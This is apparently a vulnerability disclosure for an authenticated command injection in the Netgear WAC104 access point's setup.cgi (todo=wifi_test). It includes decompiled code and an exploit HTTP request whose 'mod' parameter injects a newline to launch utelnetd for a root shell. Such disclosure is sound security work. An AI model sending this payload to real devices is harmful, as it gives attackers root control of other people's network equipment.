## Netgear WAC104 todo=wifi_test Authentication Command Injection Remote Command Execution Vulnerability

### 1.Vulnerability description

A authenticated remote command injection vulnerability exists in Netgear WAC104, which can be exploited by an authenticated remote attacker to cause Remote command execution (RCE) on an affected Netgear WAC104.<br>



The vulnerability exists in the latest firmware version ： WAC104-V1.0.4.21.img<br>

Firmware download address : https://www.downloads.netgear.com/files/GDC/WAC104/WAC104_firmware_V1.0.4.21.zip?_ga=2.248054530.446711973.1711967533-1975873394.1711967533<br>

### 2.Vulnerability details

The vulnerability is in the /usr/sbin/setup.cgi file.<br>

The vulnerability occurs in the function that handles the todo=wifi_test.<br>

```
int __fastcall sub_409C50(int a1)
{
  const char *v2; // $s2
  const char *v3; // $s1
  const char *v4; // $s0

  v2 = find_val_safe(a1, "channel");
  if ( !v2 )
    v2 = " ";
  v3 = find_val_safe(a1, "rate");
  if ( !v3 )
    v3 = " ";
  v4 = find_val_safe(a1, "mod");
  if ( !v4 )
    v4 = " ";
  COMMAND("/usr/sbin/rc fcc fcc:c%s:r%s:m%s", v2, v3, v4); //  Command Injection !!!
  html_parser("fcc.htm", a1, &key_fun_tab);
  printf("Command==fcc:c%s:r%s:m%s", v2, v3, v4);
  return 0;
}
```

The mod parameter is controlled by the attacker, and then a call to the COMMAND function can cause command injection.<br>

### 3.Vulnerability exploitation

The effect of the current exploitation is command injection.<br>

I got the root shell by executing the following command.<br>

```
data = b""
data += b"GET /setup.cgi?todo=wifi_test&channel=1&rate=1&mod=%0a/usr/sbin/utelnetd HTTP/1.1\r\n"
```